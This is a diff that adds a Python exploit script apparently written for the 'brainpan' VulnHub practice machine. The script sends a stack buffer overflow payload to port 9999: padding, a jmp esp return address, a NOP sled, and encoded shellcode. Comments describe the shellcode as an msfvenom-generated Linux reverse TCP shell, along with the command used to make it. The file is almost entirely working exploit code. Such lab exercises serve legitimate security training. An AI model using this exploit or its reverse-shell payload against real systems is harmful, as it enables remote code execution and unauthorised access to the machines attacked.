@@ -1,0 +1,29 @@
+#!/usr/bin/env python
+
+# brainpan vulnhub machine
+
+import socket
+import sys
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect(('192.168.108.131', 9999))
+
+buf = ""
+buf += "\xbb\x70\x4d\xc5\x23\xd9\xf6\xd9\x74\x24\xf4\x5d\x31"
+buf += "\xc9\xb1\x12\x83\xc5\x04\x31\x5d\x0e\x03\x2d\x43\x27"
+buf += "\xd6\xfc\x80\x50\xfa\xad\x75\xcc\x97\x53\xf3\x13\xd7"
+buf += "\x35\xce\x54\x8b\xe0\x60\x6b\x61\x92\xc8\xed\x80\xfa"
+buf += "\x0a\xa5\x1f\x7a\xe2\xb4\xdf\x6f\x40\x31\x3e\x3f\xc0"
+buf += "\x12\x90\x6c\xbe\x90\x9b\x73\x0d\x16\xc9\x1b\xe0\x38"
+buf += "\x9d\xb3\x94\x69\x4e\x21\x0c\xff\x73\xf7\x9d\x76\x92"
+buf += "\x47\x2a\x44\xd5"
+# To get reverse shell I used msfvenom payload below.
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "x00"
+# -e x86/shikata_ga_nai -f python
+
+payload = "A" * 524
+payload += "\xF3\x12\x17\x31"  # jmp esp address
+payload += "\x90" * 20  # nop
+payload += buf  # shellcode
+
+s.recv(1024)
+s.send(payload)
